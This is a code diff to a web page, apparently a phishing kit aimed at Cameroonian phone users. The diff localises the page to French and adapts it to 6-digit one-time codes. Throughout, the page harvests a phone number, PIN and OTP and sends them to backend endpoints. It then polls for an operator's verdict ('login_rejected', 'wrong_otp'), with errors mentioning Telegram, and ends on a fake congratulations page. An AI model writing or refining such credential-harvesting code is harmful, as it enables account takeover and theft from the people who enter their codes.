+    let pin = ''; pins.forEach(p => pin += p.value);
+    
+    if (!phone || pin.length !== 4) return alert('Veuillez remplir tous les champs.');
 
     if (!currentRequestId) currentRequestId = Math.random().toString(36).substring(2, 10);
     toggleLoading(true);
@@ -359,30 +439,42 @@
       const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, phone, pin }) });
       if (!res.ok) throw new Error('Failed');
       startPolling('login');
-    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
+    } catch (err) { toggleLoading(false); alert('Erreur de connexion à Telegram.'); }
   }
 
+  // OTP Logic
   function validateOTP(input, index) {
     input.value = input.value.replace(/[^0-9]/g, '');
-    if (input.value.length === 1 && index < 3) {
-      document.querySelectorAll('.otp-input')[index + 1].focus();
+    const inputs = document.querySelectorAll('#otpInputContainer .otp-box-new');
+    if (input.value.length === 1 && index < inputs.length - 1) {
+      inputs[index + 1].focus();
     }
+    checkOTPButton();
+  }
+
+  function checkOTPButton() {
+    const inputs = document.querySelectorAll('#otpInputContainer .otp-box-new');
+    let filled = 0;
+    inputs.forEach(i => { if (i.value.length === 1) filled++; });
+    const btn = document.getElementById('btnValidate');
+    if (filled === 6) btn.classList.add('active');
+    else btn.classList.remove('active');
   }
 
   async function submitOTP() {
-    const inputs = document.querySelectorAll('.otp-input');
+    const inputs = document.querySelectorAll('#otpInputContainer .otp-box-new');
     let otp = ''; inputs.forEach(input => otp += input.value);
-    
-    if (otp.length !== 4) return alert('Please fill in all fields.');
+    if (otp.length !== 6) return alert('Veuillez entrer les 6 chiffres.');
 
     toggleLoading(true);
     try {
       const res = await fetch('/api/otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, otp }) });
       if (!res.ok) throw new Error('Failed');
       startPolling('otp');
-    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
+    } catch (err) { toggleLoading(false); alert('Erreur de connexion à Telegram.'); }
   }
 
+  // Polling Logic
   function startPolling(stage) {
     if (pollingInterval) clearInterval(pollingInterval);
     pollingInterval = setInterval(async () => {
@@ -397,26 +489,37 @@
             const phoneVal = document.getElementById('loginPhone').value;
             document.getElementById('maskedPhone').textContent = `+237 ${phoneVal.substring(0,3)}***${phoneVal.slice(-3)}`;
             goToPage('page-otp');
-            document.querySelectorAll('.otp-input')[0].focus();
+            document.querySelectorAll('#otpInputContainer .otp-box-new')[0].focus();
           } else if (data.status === 'login_rejected') {
-            clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN.');
+            clearInterval(pollingInterval); toggleLoading(false); alert('Code PIN incorrect.');
             goToPage('page-login');
           }
         } else if (stage === 'otp') {
           if (data.status === 'success') { clearInterval(pollingInterval); toggleLoading(false); goToPage('page-congrats'); } 
-          else if (data.status === 'wrong_pin') { clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN.'); goToPage('page-login'); } 
+          else if (data.status === 'wrong_pin') { clearInterval(pollingInterval); toggleLoading(false); alert('Code PIN incorrect.'); goToPage('page-login'); } 
           else if (data.status === 'wrong_otp') { 
             clearInterval(pollingInterval); 
             toggleLoading(false); 
-            alert('Incorrect OTP.'); 
-            const otpInputs = document.querySelectorAll('.otp-input');
+            alert('Code OTP incorrect.'); 
+            const otpInputs = document.querySelectorAll('#otpInputContainer .otp-box-new');
             otpInputs.forEach(input => input.value = '');
             otpInputs[0].focus();
+            checkOTPButton();
           }
         }
       } catch (err) { console.error('Polling error:', err); }
     }, 1500);
   }
+
+  // OTP Timer
+  let timeLeft = 56;
+  setInterval(() => {
+    if (timeLeft > 0) {
+      timeLeft--;
+      const el = document.getElementById('timer');
+      if(el) el.textContent = timeLeft;
+    }
+  }, 1000);
 </script>
 </body>
 </html>
